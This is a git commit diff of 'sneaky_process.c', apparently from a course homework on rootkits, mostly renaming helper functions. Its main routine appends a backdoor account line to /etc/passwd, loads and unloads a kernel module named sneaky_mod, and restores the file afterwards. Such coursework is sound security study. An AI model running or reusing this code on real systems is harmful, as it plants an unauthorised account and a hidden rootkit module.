1bad6d8faf775a6a52f841467017a11c81f73ed0
wrd233 <2608242024@qq.com>
2024-05-01 23:25:46 +0800

    change process

--- homework5-kit/sneaky_process.c
+++ homework5-kit/sneaky_process.c
@@ -2,7 +2,8 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-void copyFile(const char * src, const char * dest) {
+
+void copy_file(const char * src, const char * dest) {
   if (src == NULL || dest == NULL) {
     exit(-1);
   }
@@ -29,7 +30,37 @@ void copyFile(const char * src, const char * dest) {
   fclose(srcFile);
 }
 
-void insertLine(const char * dest, const char * line) {
+// void copy_file(const char * src, const char * dest) {
+//   FILE* srcFile = fopen(src, "rb");
+//   if (srcFile == NULL) {
+//       perror("无法打开源文件");
+//       exit(EXIT_FAILURE);
+//   }
+
+//   FILE* destFile = fopen(dest, "wb");
+//   if (destFile == NULL) {
+//       perror("无法创建或打开目标文件");
+//       exit(EXIT_FAILURE);
+//   }
+  
+//   // 逐字符复制源文件到目标文件
+//   char c;
+//   while ((c = fgetc(srcFile)) != EOF) {
+//       fputc(c, destFile);
+//   }
+
+//   if (fclose(destFile) == EOF) {
+//       perror("无法关闭目标文件");
+//       exit(EXIT_FAILURE);
+//   }
+
+//   if (fclose(srcFile) == EOF) {
+//       perror("无法关闭源文件");
+//       exit(EXIT_FAILURE);
+//   }
+// }
+
+void insert_line_into_file(const char * dest, const char * line) {
   if (dest == NULL || line == NULL) {
     exit(-1);
   }
@@ -48,16 +79,36 @@ void insertLine(const char * dest, const char * line) {
   fclose(destFile);
 }
 
+// void insert_line_into_file(const char* filePath, const char* line) {
+//   if (filePath == NULL || line == NULL) {
+//     exit(EXIT_FAILURE);
+//   }
+
+//   FILE* file = fopen(filePath, "a");
+//   if (file == NULL) {
+//     exit(EXIT_FAILURE);
+//   }
+
+//   const char* currentChar = line;
+//   while (*currentChar != '\0') {
+//     char character = *currentChar;
+//     fputc(*currentChar, file);
+//     ++currentChar;
+//   }
+
+//   fclose(file);
+// }
+
 
 int main() {
   // 1. print process id
   printf("sneaky_process pid = %d\n", getpid());
 
   // 2. copy file from /etc/passwd to /tmp/passwd
-  copyFile("/etc/passwd", "/tmp/passwd");
+  copy_file("/etc/passwd", "/tmp/passwd");
 
   // 3. insert a line to the /etc/passwd
-  insertLine("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+  insert_line_into_file("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
 
   // 4. load the sneaky_mod
   char args[64];
@@ -74,7 +125,7 @@ int main() {
   system("rmmod sneaky_mod.ko");
 
   // 7. copy file from /tmp/passwd to /etc/passwd
-  copyFile("/tmp/passwd", "/etc/passwd");
+  copy_file("/tmp/passwd", "/etc/passwd");
 
   // 8. remove /tmp/passwd
   system("rm -f /tmp/passwd");
